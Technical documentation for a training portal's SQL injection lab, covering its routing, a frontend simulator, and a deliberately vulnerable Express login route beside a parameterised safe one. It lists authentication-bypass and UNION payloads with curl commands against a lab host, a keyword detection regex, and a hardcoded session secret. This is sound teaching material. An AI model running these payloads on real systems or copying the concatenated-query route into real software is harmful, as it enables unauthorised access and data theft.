# 🔐 SQL Injection Lab Simulator — Full Deep-Dive Documentation

> **Project:** GICSP Portal (`/Users/joshwa/Downloads/gicsp-portal`)  
> **Lab Slug:** `sql-injection`  
> **Lab File:** `views/sims/sqli.ejs`  
> **Backend File:** `routes.sqli-demo.js`

---

## Table of Contents

1. [Big Picture Architecture](#1-big-picture-architecture)
2. [Layer 1 — Lab Metadata (`data/labs.js`)](#2-layer-1--lab-metadata-datalabsjs)
3. [Layer 2 — Routing & Page Serving (`routes/lab.js`)](#3-layer-2--routing--page-serving-routeslabjs)
4. [Layer 3 — Lab Template (`views/lab.ejs`)](#4-layer-3--lab-template-viewslabejs)
5. [Layer 4 — The SQLi Simulator (`views/sims/sqli.ejs`)](#5-layer-4--the-sqli-simulator-viewssimssqliejs)
   - [The LABS Object](#51-the-labs-object)
   - [How Steps Are Rendered (DOM Builder)](#52-how-steps-are-rendered-dom-builder)
   - [The `runSimStep()` Function](#53-the-runsimstep-function)
6. [Layer 5 — The Backend Engine (`routes.sqli-demo.js`)](#6-layer-5--the-backend-engine-routessqli-demojs)
   - [Database Setup](#61-database-setup-in-memory-sqlite)
   - [The Audit Log Helper](#62-the-audit-log-helper)
   - [The VULNERABLE Route (`/login-vuln`)](#63-the-vulnerable-route-login-vuln)
   - [The SAFE Route (`/login-safe`)](#64-the-safe-route-login-safe)
   - [Instructor Endpoints](#65-instructor-endpoints)
7. [Layer 6 — Solution Data (`data/solutions.js`)](#7-layer-6--solution-data-datasolutionsjs)
8. [Layer 7 — Progress Tracking (`data/users.js`)](#8-layer-7--progress-tracking-datausersjs)
9. [Layer 8 — Server Bootstrap (`app.js` + `server.js`)](#9-layer-8--server-bootstrap-appjs--serverjs)
10. [Layer 9 — Security Middleware (`middleware.js`)](#10-layer-9--security-middleware-middlewarejs)
11. [How All Layers Connect — Full Request Flow](#11-how-all-layers-connect--full-request-flow)
12. [How the Simulator Works — Step-by-Step Walkthrough](#12-how-the-simulator-works--step-by-step-walkthrough)
13. [How to Build a New Lab Based on This Pattern](#13-how-to-build-a-new-lab-based-on-this-pattern)

---

## 1. Big Picture Architecture

```
BROWSER
  │
  │  GET /lab/sql-injection
  ▼
app.js                    ← Express entry point, mounts all routers
  │
  ▼
routes/lab.js             ← Handles /lab/:slug
  │   reads ↓
  ├── data/labs.js         ← Finds the lab object for slug="sql-injection"
  │   reads ↓
  └── data/users.js        ← Gets/marks progress for the current user
  │
  ▼
views/lab.ejs             ← Shell HTML (nav, sidebar, "Mark Complete" button)
  │   includes ↓
  └── views/sims/sqli.ejs  ← The ACTUAL interactive simulator (all the magic)

POST /api/auth/login-vuln  ← Backend demo route (intentionally broken)
POST /api/auth/login-safe  ← Backend demo route (correctly secured)
     served by →
routes.sqli-demo.js        ← Mounted in server.js under /api/auth

GET  /solution/sql-injection
  ▼
routes/solution.js         ← Renders the solution guide
  │  reads ↓
  └── data/solutions.js    ← Step-by-step walkthrough + quiz answers
```

The entire portal is a **Node.js + Express + EJS** stack. No React, no Vue, no build step needed. Just EJS templates (server-rendered HTML) and vanilla JavaScript on the frontend.

---

## 2. Layer 1 — Lab Metadata (`data/labs.js`)

**File:** [`data/labs.js`](file:///Users/joshwa/Downloads/gicsp-portal/data/labs.js)

This file is the **single source of truth** for every lab in the portal. It exports a plain JavaScript array of objects. Each object defines one lab.

```js
// data/labs.js (line 171–183 — the SQL injection entry)
module.exports = [
  // ... (other labs) ...
  {
    id: 14,                                   // Unique numeric ID
    slug: 'sql-injection',                    // URL identifier: /lab/sql-injection
    day: 3,                                   // Which training day it belongs to
    order: 4,                                 // Position within that day's labs
    title: 'Bypassing Auth with SQL Injection',
    category: 'Web Application',
    icon: 'database',                         // Tabler Icon name (ti-database)
    difficulty: 'Intermediate',
    duration: '40 min',
    description: 'Exploit SQL injection vulnerabilities in a simulated HMI web portal...',
    objectives: [                             // Shown in the sidebar
      'Identify SQL injection entry points',
      'Bypass login authentication',
      'Extract database contents',
      'Understand remediation'
    ],
    tools: [                                  // Tool badges in the sidebar
      'Browser',
      'Burp Suite (manual)',
      'SQL injection payloads'
    ],
    examDomain: 'ICS Web Application Security',
    sim: 'sqli'                               // ← KEY FIELD: maps to views/sims/sqli.ejs
  },
  // ...
];
```

### The `sim` Field Is the Magic Link

The `sim: 'sqli'` field is what connects the lab metadata to the simulator. When `views/lab.ejs` renders, it includes the simulator like this:

```ejs
<%- include('sims/' + lab.sim) %>
```

So `sim: 'sqli'` → includes `views/sims/sqli.ejs`. That's the entire connection. Change `sim` to any other filename and a completely different simulator loads.

---

## 3. Layer 2 — Routing & Page Serving (`routes/lab.js`)

**File:** [`routes/lab.js`](file:///Users/joshwa/Downloads/gicsp-portal/routes/lab.js)

This router handles two routes:

### Route 1: `GET /lab/:slug` — Serve the lab page

```js
router.get('/:slug', requireAuth, (req, res) => {
  // 1. Find the lab object matching the URL slug
  const lab = labs.find(l => l.slug === req.params.slug);
  if (!lab) return res.redirect('/dashboard');   // Unknown lab → go home

  // 2. Mark that this user has started the lab (for progress tracking)
  markStarted(req.session.user.id, lab.slug);

  // 3. Get full progress record for this user
  const progress = getProgress(req.session.user.id);
  const labProgress = progress[lab.slug] || {};   // Defaults to empty {}

  // 4. Find previous/next labs (for navigation arrows in sidebar)
  const allLabs = labs.filter(l => l.day === lab.day)
                       .sort((a, b) => a.order - b.order);
  const idx  = allLabs.findIndex(l => l.slug === lab.slug);
  const prev = idx > 0 ? allLabs[idx - 1] : null;
  const next = idx < allLabs.length - 1 ? allLabs[idx + 1] : null;

  // 5. Render the lab.ejs template, passing all variables
  res.render('lab', { lab, labProgress, prev, next });
});
```

**What `requireAuth` does:** Checks `req.session.user`. If not logged in, redirects to `/login`. This is a simple session guard defined in `routes/lab.js`:

```js
function requireAuth(req, res, next) {
  if (!req.session.user) return res.redirect('/login');
  next();
}
```

### Route 2: `POST /lab/:slug/complete` — Mark lab as done

```js
router.post('/:slug/complete', requireAuth, (req, res) => {
  const lab = labs.find(l => l.slug === req.params.slug);
  if (!lab) return res.json({ ok: false });
  markComplete(req.session.user.id, lab.slug);  // Saves completion to memory
  res.json({ ok: true });
});
```

This is called by the "Mark as Complete" button in `lab.ejs`:

```js
async function markComplete() {
  const res = await fetch('/lab/<%= lab.slug %>/complete', { method: 'POST' });
  const data = await res.json();
  if (data.ok) { /* update button style */ }
}
```

---

## 4. Layer 3 — Lab Template (`views/lab.ejs`)

**File:** [`views/lab.ejs`](file:///Users/joshwa/Downloads/gicsp-portal/views/lab.ejs)

This is the **shell HTML** for every lab. The EJS template receives `{ lab, labProgress, prev, next }` from the router. It renders:

```
┌─────── topnav ────────────────────────────────────────┐
│  ← Dashboard   Day 3 › Bypassing Auth with SQL Inject │
│                                 [Intermediate] [40min] │
└───────────────────────────────────────────────────────┘

┌── sidebar ───┬──── main (sim-container) ──────────────┐
│  🗄️ icon      │                                        │
│  Lab Title   │  ← This is where sqli.ejs renders →    │
│  Category    │                                        │
│  Description │                                        │
│  Objectives  │                                        │
│  Tools       │                                        │
│  Exam Domain │                                        │
│  [Complete]  │                                        │
│  [Solution]  │                                        │
│  ← prev next→│                                        │
└──────────────┴────────────────────────────────────────┘
```

The **critical line** in `lab.ejs` is:

```ejs
<div id="sim-container">
  <%- include('sims/' + lab.sim) %>  <!-- This loads sqli.ejs -->
</div>
```

The `<%-` (without escaping) means the included file's HTML is injected raw — so EJS in `sqli.ejs` also gets processed.

---

## 5. Layer 4 — The SQLi Simulator (`views/sims/sqli.ejs`)

**File:** [`views/sims/sqli.ejs`](file:///Users/joshwa/Downloads/gicsp-portal/views/sims/sqli.ejs)

This is the heart of the entire lab. It's 78 lines of EJS/HTML/JavaScript that creates the entire interactive simulator. Let's break it into exact pieces.

### 5.1 The LABS Object

This is a **giant JavaScript object** inside a `<script>` tag. It contains all 20 lab simulators' data in one place. The simulator for `sqli` is at key `sqli`:

```js
const LABS = {
  // ... (hmi, physical, nmap, architecture, etc.) ...
  sqli: {
    steps: [
      'Open HMI web portal at http://192.168.1.100/login',
      "Try: admin' OR 1=1-- in username field → observe result",
      "Bypass authentication: username=admin' OR '1'='1', password=anything",
      'Extract DB version: admin\' UNION SELECT @@version,null--',
      'Enumerate tables: UNION SELECT table_name,null FROM information_schema.tables--'
    ],
    cmds: [
      "curl -d 'user=admin&pass=x' http://192.168.1.100/login → 401",
      "curl -d \"user=admin' OR 1=1--&pass=x\" http://192.168.1.100/login → 200 LOGIN OK",
      "Auth bypass confirmed: session cookie returned without valid credentials",
      "UNION SELECT: DB version = Microsoft SQL Server 2019",
      "UNION SELECT tables: users, plc_config, historian_data, alarm_log"
    ]
  },
  // ... (fuzzing, powershell, etc.) ...
};
```

**`steps` array** — One string per step. This becomes the step card **title** (bold text shown to the student).  
**`cmds` array** — One string per step. This is the pre-filled **command** shown in the terminal-looking dark box. Each `steps[i]` maps 1:1 to `cmds[i]`.

### 5.2 How Steps Are Rendered (DOM Builder)

After defining `LABS`, the code immediately runs an **IIFE** (Immediately Invoked Function Expression):

```js
(function() {
  // 1. Get the sqli lab data
  const lab = LABS['sqli'];
  if (!lab) return;  // Safety guard: if key doesn't exist, stop

  // 2. Get the container div where cards will be injected
  const container = document.getElementById('sqli-steps');

  // 3. Loop through each step and build a card
  lab.steps.forEach((step, i) => {
    const card = document.createElement('div');
    card.className = 'step-card-sim';

    // Inline styles for the card (dark surface, border, rounded corners)
    card.style.cssText = `
      background: var(--surface);
      border: 1px solid var(--border);
      border-radius: 10px;
      padding: 14px 16px;
      margin-bottom: 10px
    `;

    // Inject the card's HTML structure
    card.innerHTML = `
      <!-- TOP ROW: Step number circle + Step title + Run button -->
      <div style="display:flex; align-items:center; gap:10px; margin-bottom:8px">
        <!-- Step number badge (circle) -->
        <div style="width:26px; height:26px; border-radius:50%; border:1px solid var(--border);
                    display:flex; align-items:center; justify-content:center;
                    font-size:12px; font-weight:700; color:var(--muted); flex-shrink:0">
          ${i + 1}
        </div>

        <!-- Step title text -->
        <div style="font-size:14px; font-weight:600">${step}</div>

        <!-- Run button — calls runSimStep(this, i, 'sqli') -->
        <button
          onclick="runSimStep(this, ${i}, 'sqli')"
          style="margin-left:auto; padding:5px 14px; background:transparent;
                 border:1px solid var(--border); border-radius:7px; color:var(--muted);
                 font-size:12px; cursor:pointer; font-family:var(--sans);
                 display:flex; align-items:center; gap:5px">
          <i class="ti ti-player-play"></i> Run
        </button>
      </div>

      <!-- TERMINAL BOX: Dark code display showing the command -->
      <div style="background:#0d1117; border:1px solid var(--border); border-radius:8px;
                  padding:10px 14px; font-family:var(--mono); font-size:12px; color:#8b949e"
           id="out-sqli-${i}">
        <span style="color:#57ab5a">analyst@lab:~$ </span>
        <span style="color:#e6edf3">${lab.cmds[i]}</span>
      </div>
    `;

    // Append the finished card to the container
    container.appendChild(card);
  });
})();
```

**What this produces visually (for each of 5 steps):**

```
┌─────────────────────────────────────────────────────────┐
│  [1]  Open HMI web portal at http://192.168.1.100/login │ [▶ Run]
│                                                          │
│  analyst@lab:~$  curl -d 'user=admin&pass=x' ...        │
│                                                          │
└─────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────┐
│  [2]  Try: admin' OR 1=1-- in username field             │ [▶ Run]
│                                                          │
│  analyst@lab:~$  curl -d "user=admin' OR 1=1--..." → 200 │
│                                                          │
└─────────────────────────────────────────────────────────┘
... and so on for 5 steps
```

The `id="out-sqli-${i}"` on the terminal box is **critical** — it's the target where the result gets appended when you click "Run".

### 5.3 The `runSimStep()` Function

This function is the **execution engine** for the simulator. It fires when you click any "Run" button.

```js
function runSimStep(btn, i, sim) {
  // btn = the button element that was clicked
  // i   = which step index (0, 1, 2, 3, or 4)
  // sim = which lab ('sqli')

  // Step 1: Find the terminal output box by its ID
  const out = document.getElementById('out-' + sim + '-' + i);
  // e.g., 'out-sqli-0', 'out-sqli-1', etc.

  // Step 2: Style the button → turn it green with a checkmark
  btn.style.borderColor = 'var(--green)';
  btn.style.color = 'var(--green)';
  btn.innerHTML = '<i class="ti ti-check"></i> Done';

  // Step 3: The results lookup table
  // This is a plain JS object mapping each sim name to an array of result strings.
  // Each array has one result string per step.
  const results = {
    // ... other labs ...
    sqli: [
      'Login: 401 (normal auth)',                              // Step 0 result
      'SQLi: 200 OK — auth bypassed',                         // Step 1 result
      'DB version: MSSQL 2019',                               // Step 2 result
      'Tables: users, plc_config, historian_data',            // Step 3 result
      'UNION SELECT data extracted'                           // Step 4 result
    ],
    // ...
  };

  // Step 4: Look up the result for this step
  const r = (results[sim] || ['Step executed successfully'])[i]
            || 'Command executed successfully';
  // Falls back to generic messages if sim or index is unknown

  // Step 5: After 400ms delay (so it feels like a real command running),
  //         append the result text to the terminal box
  setTimeout(() => {
    const result = document.createElement('div');
    result.style.cssText = 'margin-top:6px; color:#57ab5a; font-size:12px';
    result.textContent = '→ ' + r;
    out.appendChild(result);
    // This appends BELOW the command, so the terminal now shows:
    // analyst@lab:~$ curl -d 'user=admin...' → 401
    // → Login: 401 (normal auth)    ← This new line appears
  }, 400);
}
```

**The full UX flow for clicking "Run" on Step 2:**

1. Button clicked → `runSimStep(btn, 1, 'sqli')` fires
2. Button instantly turns green + changes to `✓ Done`
3. 400ms pause (simulates command execution)
4. A green line appears in the terminal: `→ SQLi: 200 OK — auth bypassed`

That's it. No actual network request, no backend call. The simulator is **100% frontend-only** — pure JavaScript DOM manipulation.

---

## 6. Layer 5 — The Backend Engine (`routes.sqli-demo.js`)

**File:** [`routes.sqli-demo.js`](file:///Users/joshwa/Downloads/gicsp-portal/routes.sqli-demo.js)

While the `sqli.ejs` simulator is frontend-only, the project also includes a **real working** SQL injection demo backend. This is for instructors who want to demo actual HTTP calls.

### 6.1 Database Setup — In-Memory SQLite

```js
const Database = require('better-sqlite3');

// ':memory:' creates a fresh DB every time the server starts.
// Nothing persists between restarts — perfect for a demo/lab.
const db = new Database(':memory:');

db.exec(`
  CREATE TABLE IF NOT EXISTS users (
    id       INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT NOT NULL,
    password TEXT NOT NULL,           -- Stored in PLAINTEXT intentionally for the demo
    role     TEXT NOT NULL DEFAULT 'operator'
  );

  -- Pre-seed three users
  INSERT INTO users (username, password, role) VALUES
    ('admin',    'wtp2024!',   'Administrator'),
    ('operator', 'Op3rAt0r',   'Operator'),
    ('viewer',   'view123',    'Viewer');
`);
```

**Why in-memory?** Because students need a clean, predictable database every class. No migration scripts, no cleanup — just restart the server and the DB is fresh.

**Why plaintext passwords?** This is intentional for the teaching demo. In real apps you always use bcrypt. Here, the instructor wants students to see the actual password when they extract the DB.

### 6.2 The Audit Log Helper

```js
function auditLog(route, username, success, injected, ip) {
  const ts = new Date().toISOString();
  // Determine the flag label based on what happened
  const flag = injected ? '[⚡ SQLI]'       // Injection detected
             : success  ? '[✓ OK]'          // Normal successful login
                        : '[✗ FAIL]';       // Normal failed login

  // Log to the server console (instructor can watch in terminal)
  console.log(`[AUTH ${flag}] ${ts} route=${route} user=${username} ip=${ip}`);
}
```

This runs on every login attempt. The instructor running `npm start` sees all attempts in real time in their terminal.

### 6.3 The VULNERABLE Route (`/login-vuln`)

```js
router.post('/login-vuln', (req, res) => {
  // 1. Extract username and password from the request body
  const { username = '', password = '' } = req.body;

  // ⚠️ THE VULNERABILITY: Direct string concatenation into SQL
  // If username = "admin' OR '1'='1'" then the query becomes:
  // SELECT * FROM users WHERE username = 'admin' OR '1'='1'' AND password = 'anything'
  //                                       ↑ This is always TRUE → returns admin row
  const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;

  let user = null;
  let injected = false;

  try {
    // 2. Prepare and execute — SQLite will run WHATEVER was injected
    const stmt = db.prepare(query);
    user = stmt.get();  // Returns first matching row, or null

  } catch (err) {
    // 3. If the SQL is malformed (e.g., bad injection syntax), it throws an error.
    // ⚠️ We return the RAW error to the client — leaking DB structure.
    // This is "error-based SQLi" — a real attack technique.
    injected = true;
    auditLog('VULN', username, false, true, req.ip);
    return res.status(200).json({
      ok: false,
      error: err.message,   // ← Leaks "near 'xxx': syntax error"
      query,                // ← Leaks the full SQL query structure
      hint: 'Error-based SQLi — check the error field for extracted data',
    });
  }

  // 4. Heuristic injection detector (for logging/teaching only — not a real fix)
  const injPat = /[';]|--|b(OR|AND|UNION|SELECT|SLEEP|DROP|CAST|CONVERT)b/i;
  if (injPat.test(username) || injPat.test(password)) injected = true;

  auditLog('VULN', username, !!user, injected, req.ip);

  // 5. If a user row was found (even via injection), return "success"
  if (user) {
    return res.json({
      ok: true,
      user: { id: user.id, username: user.username, role: user.role },
      injected,
      query,    // ← Exposes the full SQL query (for teaching purposes)
      message: injected
        ? '⚡ Authenticated via SQLi bypass — auth circumvented'
        : '✓ Authenticated normally',
    });
  }

  // 6. No user found → failed login
  return res.json({ ok: false, query, message: '✗ Invalid credentials' });
});
```

**What happens with each attack payload:**

| Payload (username) | Resulting SQL | What Happens |
|---|---|---|
| `admin' OR '1'='1` | `WHERE username = 'admin' OR '1'='1' AND password = '...'` | `'1'='1'` is always true → returns admin |
| `admin'--` | `WHERE username = 'admin'--' AND password = '...'` | `--` comments out password check → auth bypass |
| `' OR 1=1--` | `WHERE username = '' OR 1=1--' AND password = '...'` | Always true, returns first row |
| `admin' UNION SELECT @@version,null--` | Two SELECTs merged | Returns DB version string |

### 6.4 The SAFE Route (`/login-safe`)

```js
router.post('/login-safe', (req, res) => {
  const { username = '', password = '' } = req.body;

  // ✅ THE FIX: Parameterised query with ? placeholders
  // The query STRUCTURE is sent to the DB first (without any user data).
  // Then user data is sent SEPARATELY as bound parameters.
  // The DB treats the parameters as PURE DATA — they can NEVER be SQL code.
  const stmt = db.prepare(
    `SELECT id, username, role FROM users WHERE username = ? AND password = ?`
    //                                                    ↑           ↑
    //                                         Placeholders — not string concat
  );

  let user = null;
  try {
    // Pass username and password as separate values (not in the SQL string)
    user = stmt.get(username, password);
  } catch (err) {
    return res.status(500).json({ ok: false, message: 'Internal error' });
  }

  auditLog('SAFE', username, !!user, false, req.ip);

  if (user) {
    req.session.user = { id: user.id, username: user.username, role: user.role };
    return res.json({ ok: true, user: req.session.user, message: '✓ Authenticated' });
  }

  return res.json({ ok: false, message: '✗ Invalid credentials' });
});
```

**Why parameterised queries are safe:**

Even if you send `admin' OR '1'='1` as the username to `/login-safe`, the DB receives:
- **Query:** `SELECT ... WHERE username = ? AND password = ?`
- **Parameter 1:** `admin' OR '1'='1` (the entire string is treated as a literal value)
- **Parameter 2:** `anything`

The DB looks for a user whose username is literally `admin' OR '1'='1'` — which doesn't exist → login fails. The injection has **zero power** because it never touches SQL grammar.

### 6.5 Instructor Endpoints

```js
// Show current DB state — only accessible from localhost
router.get('/demo/users', (req, res) => {
  const isLocal = ['::1', '127.0.0.1', '::ffff:127.0.0.1'].includes(req.ip);
  if (!isLocal) return res.status(403).json({ ok: false });

  const users  = db.prepare('SELECT id, username, role FROM users').all();
  const schema = db.prepare("SELECT sql FROM sqlite_master WHERE type='table'").all();
  res.json({ users, schema });
});

// Reset DB to default state — only accessible from localhost
router.post('/demo/reset', (req, res) => {
  const isLocal = ['::1', '127.0.0.1', '::ffff:127.0.0.1'].includes(req.ip);
  if (!isLocal) return res.status(403).json({ ok: false });

  db.exec(`DELETE FROM users`);
  db.exec(`INSERT INTO users VALUES ...`);  // Re-seeds the 3 default users
  res.json({ ok: true, message: 'DB reset to default users' });
});
```

---

## 7. Layer 6 — Solution Data (`data/solutions.js`)

**File:** [`data/solutions.js`](file:///Users/joshwa/Downloads/gicsp-portal/data/solutions.js)

This file exports an object where each key is a lab slug. The `sql-injection` key contains the full instructor solution:

```js
'sql-injection': {
  title: 'Bypassing Auth with SQL Injection',
  summary: 'Web-based HMIs and historian portals frequently have SQL injection vulnerabilities...',

  steps: [
    // Step 1
    {
      step:   'Identify the login form',      // Card title
      type:   'recon',                        // Badge color (red for recon)
      answer: 'Target: HMI web portal at http://192.168.1.100/login...',  // Explanation text
      cmd:    `# Normal login test
curl -s -d 'username=admin&password=wrongpassword' http://192.168.1.100/login
# Response: 401 Unauthorized
...`,                                         // Copy-able command block
      result: 'SQL injection confirmed. Error message reveals database type (MySQL).'
    },

    // Step 2
    {
      step:   'Authentication bypass',
      type:   'attack',                       // Red badge
      answer: 'Classic SQLi bypass: inject OR 1=1--...',
      cmd:    `curl -s -d "username=admin' OR '1'='1'--&password=anything" ...`,
      result: 'Authentication bypassed. Admin session obtained.'
    },

    // Step 3
    {
      step:   'Extract database version',
      type:   'attack',
      answer: 'UNION-based SQLi extracts data from other tables...',
      cmd:    `curl -d "username=admin' UNION SELECT @@version,NULL--&password=x" ...`,
      result: 'Database: Microsoft SQL Server 2019.'
    },

    // Step 4
    {
      step:   'Enumerate tables',
      type:   'attack',
      answer: 'Query information_schema.tables to list all database tables...',
      cmd:    `curl -d "username=admin' UNION SELECT table_name,NULL FROM information_schema.tables--..." ...`,
      result: 'All user credentials exposed. 3 accounts including plaintext passwords.'
    },

    // Step 5
    {
      step:   'Remediation',
      type:   'remediation',                  // Green badge
      answer: 'Fix: parameterised queries (prepared statements)...',
      cmd:    `# FIXED: Parameterised query (Python/pyodbc)
cursor.execute(
  'SELECT * FROM users WHERE username=? AND password=?',
  (username, password)
)`,
      result: 'Parameterised queries: SQLi impossible.'
    }
  ],

  quiz: [
    // 3 multiple choice questions with correct index and explanation
    {
      q: "Why does admin' OR '1'='1'-- bypass authentication?",
      options: [
        'It encrypts the password',
        "OR '1'='1' makes WHERE always TRUE; -- comments out the password check",  // ← correct (index 1)
        'It creates a new admin account',
        'It resets the admin password'
      ],
      correct: 1,
      a: "The injected OR '1'='1' makes the WHERE clause always evaluate to TRUE..."
    },
    // ... 2 more questions
  ]
}
```

### How the Solution Page Uses This Data

`views/solution.ejs` receives `{ lab, solution }` from `routes/solution.js` and loops over `solution.steps`:

```ejs
<% solution.steps.forEach((step, i) => { %>
  <div class="step-block">
    <div class="step-header" onclick="toggleStep(<%= i %>)">
      <div class="step-num <%= step.type %>"><%= i + 1 %></div>  <!-- Colored badge -->
      <div class="step-title-text"><%= step.step %></div>
      <span class="step-type-badge"><%= step.type %></span>
      <i class="ti ti-chevron-down step-chevron"></i>
    </div>
    <div class="step-body">   <!-- Hidden by default, toggled by toggleStep() -->
      <div class="answer-text"><%= step.answer %></div>
      <pre class="cmd-text"><%= step.cmd %></pre>
      <div class="result-block"><%= step.result %></div>
    </div>
  </div>
<% }) %>
```

Steps are **collapsed by default**. Clicking a header calls `toggleStep(i)` which toggles the `.open` CSS class.

---

## 8. Layer 7 — Progress Tracking (`data/users.js`)

**File:** [`data/users.js`](file:///Users/joshwa/Downloads/gicsp-portal/data/users.js)

```js
// In-memory store: { userId: { labSlug: { completed, startedAt, completedAt } } }
const progress = {};

function markStarted(userId, labSlug) {
  if (!progress[userId]) progress[userId] = {};
  // Only set started once — don't overwrite if already exists
  if (!progress[userId][labSlug]) {
    progress[userId][labSlug] = {
      completed: false,
      startedAt: new Date().toISOString()
    };
  }
}

function markComplete(userId, labSlug) {
  if (!progress[userId]) progress[userId] = {};
  progress[userId][labSlug] = {
    completed: true,
    completedAt: new Date().toISOString()
  };
}

function getProgress(userId) {
  if (!progress[userId]) progress[userId] = {};
  return progress[userId];
}
```

**Progress data structure example:**

```json
{
  "1": {
    "sql-injection": {
      "completed": true,
      "completedAt": "2026-08-19T17:30:00.000Z"
    },
    "plc-programming": {
      "completed": false,
      "startedAt": "2026-08-19T16:00:00.000Z"
    }
  }
}
```

> [!WARNING]
> This is **in-memory only** — if the server restarts, all progress is lost. For a production portal, this would use a database (SQLite, PostgreSQL) or a file-based store.

---

## 9. Layer 8 — Server Bootstrap (`app.js` + `server.js`)

**File:** [`app.js`](file:///Users/joshwa/Downloads/gicsp-portal/app.js)

```js
const app = express();
app.set('view engine', 'ejs');           // EJS is the templating engine
app.set('views', path.join(__dirname, 'views'));  // Views folder

app.use(express.urlencoded({ extended: true }));  // Parse form POST bodies
app.use(express.json());                          // Parse JSON POST bodies
app.use(express.static(path.join(__dirname, 'public')));  // Serve CSS/images

// Session middleware (8-hour cookie)
app.use(session({
  secret: 'gicsp-ics410-lab-secret-2025',
  resave: false,
  saveUninitialized: false,
  cookie: { maxAge: 8 * 60 * 60 * 1000 }
}));

// Make session user available in all EJS templates as `user`
app.use((req, res, next) => {
  res.locals.user = req.session.user || null;
  next();
});

// Mount routers
app.use('/', authRouter);           // /login, /logout
app.use('/dashboard', dashRouter);  // /dashboard
app.use('/lab', labRouter);         // /lab/:slug, /lab/:slug/complete
app.use('/solution', solutionRouter); // /solution/:slug
```

**File:** [`server.js`](file:///Users/joshwa/Downloads/gicsp-portal/server.js) (the bigger server with Socket.io and Modbus)

```js
// Mounts the SQLi demo router
const sqlDemoRouter = require('./routes.sqli-demo');
// (line 24)

// The route is mounted at /api/auth so:
// POST /api/auth/login-vuln → routes.sqli-demo.js /login-vuln handler
// POST /api/auth/login-safe → routes.sqli-demo.js /login-safe handler
app.use('/api/auth', sqlDemoRouter);
```

---

## 10. Layer 9 — Security Middleware (`middleware.js`)

**File:** [`middleware.js`](file:///Users/joshwa/Downloads/gicsp-portal/middleware.js)

```js
// Rate limiter for login endpoint: 10 attempts per 10 minutes per IP
const loginLimiter = rateLimit({
  windowMs: 10 * 60 * 1000,
  max: 10,
  skipSuccessfulRequests: true,  // Successful logins don't count against limit
  handler: (req, res) => {
    res.status(429).json({ ok: false, message: 'Too many login attempts...' });
  }
});

// Auth guard for page routes
function requireAuth(req, res, next) {
  if (req.session?.user) return next();
  // For API calls: return 401 JSON
  // For page requests: redirect to login page
  if (req.headers.accept?.includes('application/json') || req.path.startsWith('/api/')) {
    return res.status(401).json({ ok: false, code: 'UNAUTHENTICATED' });
  }
  res.redirect('/');
}

// Security headers applied to every response
function securityHeaders(req, res, next) {
  res.setHeader('X-Content-Type-Options', 'nosniff');     // Prevent MIME sniffing
  res.setHeader('X-Frame-Options', 'DENY');               // No iframes
  res.setHeader('Referrer-Policy', 'same-origin');
  res.setHeader('Content-Security-Policy', "default-src 'self'; ...");
  next();
}
```

---

## 11. How All Layers Connect — Full Request Flow

```
Student clicks /lab/sql-injection in their browser
│
▼ GET /lab/sql-injection
app.js → routes/lab.js
  ├─ requireAuth() → checks req.session.user → OK (student is logged in)
  ├─ labs.find(l => l.slug === 'sql-injection')
  │   → { id:14, slug:'sql-injection', sim:'sqli', title:'...', ... }
  ├─ markStarted(userId, 'sql-injection')
  │   → progress[userId]['sql-injection'] = { completed:false, startedAt:'...' }
  ├─ getProgress(userId) → { 'sql-injection': { completed: false, ... } }
  ├─ Find prev/next labs (id:13 = wireless, id:15 = password-fuzzing)
  └─ res.render('lab', { lab, labProgress, prev, next })
        │
        ▼  views/lab.ejs renders:
           - <nav> with breadcrumb "Day 3 › Bypassing Auth with SQL Injection"
           - <aside> sidebar with objectives, tools, complete button
           - <main> which does: <%- include('sims/sqli') %>
                │
                ▼  views/sims/sqli.ejs renders:
                   - <div class="sim-wrap">
                   - <div class="sim-header">
                   - <div id="sqli-steps">  ← empty div, filled by JS
                   - <script> with LABS object + IIFE that builds 5 cards
                   - <script> with runSimStep() function

Browser receives full HTML page.

JavaScript IIFE runs:
  - Reads LABS['sqli'].steps and LABS['sqli'].cmds
  - Builds 5 step cards with DOM createElement
  - Appends each card to #sqli-steps div
  → Student sees 5 interactive step cards

Student clicks "Run" on Step 2:
  runSimStep(btn, 1, 'sqli')
  - Turns button green + "Done"
  - Waits 400ms
  - Appends green text to #out-sqli-1:
    → "SQLi: 200 OK — auth bypassed"

Student clicks "Mark as Complete":
  fetch('/lab/sql-injection/complete', { method: 'POST' })
  routes/lab.js → markComplete(userId, 'sql-injection')
  progress[userId]['sql-injection'] = { completed: true, completedAt: '...' }
  Response: { ok: true }
  Button UI updates to green "✓ Lab Completed"
```

---

## 12. How the Simulator Works — Step-by-Step Walkthrough

### The 5 SQLi Lab Steps Explained

**Step 1: Open HMI web portal**
- **Goal:** Verify the target exists and normal login works
- **Command shown:** `curl -d 'user=admin&pass=x' http://192.168.1.100/login → 401`
- **Result:** `Login: 401 (normal auth)` 
- **Teaching point:** Normal failed login. Establishes baseline before attack.

**Step 2: Try SQL injection probe**
- **Goal:** Discover the login form is vulnerable
- **Command shown:** `curl -d "user=admin' OR 1=1--&pass=x" ... → 200 LOGIN OK`
- **Result:** `SQLi: 200 OK — auth bypassed`
- **Teaching point:** The single quote breaks the SQL syntax. OR 1=1 makes query always true. `--` comments out the password check.

**Step 3: Full authentication bypass**
- **Goal:** Demonstrate the complete auth bypass
- **Command shown:** `Auth bypass confirmed: session cookie returned without valid credentials`
- **Result:** `DB version: MSSQL 2019`
- **Teaching point:** The session cookie proves you're "logged in" as admin without knowing any password.

**Step 4: Extract database version (UNION injection)**
- **Goal:** Move beyond auth bypass to data extraction
- **Command shown:** `UNION SELECT: DB version = Microsoft SQL Server 2019`
- **Result:** `Tables: users, plc_config, historian_data, alarm_log`
- **Teaching point:** UNION SELECT appends a second query. `@@version` extracts the DB version — proof that arbitrary data can be read.

**Step 5: Enumerate all tables**
- **Goal:** Show the full impact — complete database disclosure
- **Command shown:** `UNION SELECT tables: users, plc_config, historian_data, alarm_log`
- **Result:** `UNION SELECT data extracted`
- **Teaching point:** The database contains PLC configs, historian data, alarm logs — critical ICS infrastructure data all exposed by a single SQL injection attack.

### The Vulnerable vs Safe Query Comparison

```sql
-- ❌ VULNERABLE (routes.sqli-demo.js /login-vuln)
-- User input is pasted directly into the SQL string
SELECT * FROM users WHERE username = 'admin' OR '1'='1'' AND password = 'anything'
--                                  ↑ injected code executes as SQL ↑

-- ✅ SAFE (routes.sqli-demo.js /login-safe)
-- Query structure is fixed. Input is data only.
